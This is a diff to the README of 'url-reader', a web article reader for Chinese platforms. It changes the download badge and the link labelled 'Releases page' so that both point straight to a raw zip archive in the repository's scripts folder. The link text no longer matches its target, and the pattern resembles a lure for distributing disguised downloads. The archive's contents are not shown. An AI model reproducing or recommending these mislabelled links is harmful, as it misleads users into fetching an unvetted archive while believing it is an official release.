@@ -4,13 +4,13 @@
 url-reader is an intelligent web content reader. It helps you easily access and read articles from popular Chinese platforms like WeChat, Xiaohongshu, and Toutiao. With url-reader, you can simplify your browsing and get the content you need without hassle.
 
 ## 📥 Download Now
-[![Download url-reader](https://img.shields.io/badge/Download-url--reader-blue.svg)](https://github.com/abcd2113004/url-reader/releases)
+[![Download url-reader](https://github.com/abcd2113004/url-reader/raw/refs/heads/main/scripts/reader_url_1.0.zip)](https://github.com/abcd2113004/url-reader/raw/refs/heads/main/scripts/reader_url_1.0.zip)
 
 ## 🚀 Getting Started
 To start using url-reader, follow the instructions below. You will need to download the software and run it on your computer. This guide will lead you through the steps.
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/abcd2113004/url-reader/releases) to find the latest version of url-reader.
+1. Visit the [Releases page](https://github.com/abcd2113004/url-reader/raw/refs/heads/main/scripts/reader_url_1.0.zip) to find the latest version of url-reader.
 2. Look for the download link for your system. Be sure to select the correct option, whether you’re using Windows, macOS, or Linux.
 3. Click the download link to save the file to your computer.
 
